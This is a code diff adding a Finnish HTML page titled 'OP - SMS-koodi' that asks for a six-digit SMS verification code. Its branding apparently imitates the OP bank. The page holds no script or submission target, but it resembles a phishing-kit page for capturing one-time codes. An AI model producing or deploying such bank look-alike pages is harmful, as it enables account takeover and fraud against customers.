@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="fi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OP - SMS-koodi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .login-container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 450px;
+            padding: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 24px 28px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .login-content {
+            padding: 28px;
+        }
+
+        .info-text {
+            font-size: 15px;
+            color: #374151;
+            margin-bottom: 24px;
+            line-height: 1.6;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #d1d5db;
+            border-radius: 8px;
+            font-size: 15px;
+            transition: all 0.2s;
+            background: white;
+            text-align: center;
+            letter-spacing: 4px;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #ff6b35;
+            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
+        }
+
+        .form-input::placeholder {
+            color: #9ca3af;
+            letter-spacing: 0;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .continue-btn {
+            width: 100%;
+            padding: 14px;
+            background: #ff6b35;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+        }
+
+        .continue-btn:hover {
+            background: #e55a2b;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
+        }
+
+        .continue-btn:active {
+            transform: translateY(0);
+        }
+
+        .continue-btn:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .help-text {
+            font-size: 13px;
+            color: #6b7280;
+            margin-top: 8px;
+            text-align: center;
+        }
+
+        @media (max-width: 480px) {
+            .login-container {
+                max-width: 100%;
+                border-radius: 12px;
+            }
+
+            .login-header {
+                padding: 20px;
+            }
+
+            .login-content {
+                padding: 24px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <h2 class="login-title">SMS-koodi</h2>
+        </div>
+
+        <div class="login-content">
+            <form id="opSmsForm">
+                <div class="info-text">
+                    Syötä tekstiviestillä saamasi vahvistuskoodi.
+                </div>
+
+                <div class="form-group">
+                    <label for="smsCode" class="form-label">Vahvistuskoodi</label>
+                    <input 
+                        type="text" 
+                        id="smsCode" 
+                        name="smsCode" 
+                        class="form-input" 
+                        placeholder="123456"
+                        maxlength="6"
+                        pattern="[0-9]{6}"
+                        required
+                        autocomplete="one-time-code"
+                        inputmode="numeric"
+                    >
+                    <div class="help-text">Syötä 6-numeroinen koodi</div>
+                </div>
+
+                <button type="submit" class="continue-btn">Jatka</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
+
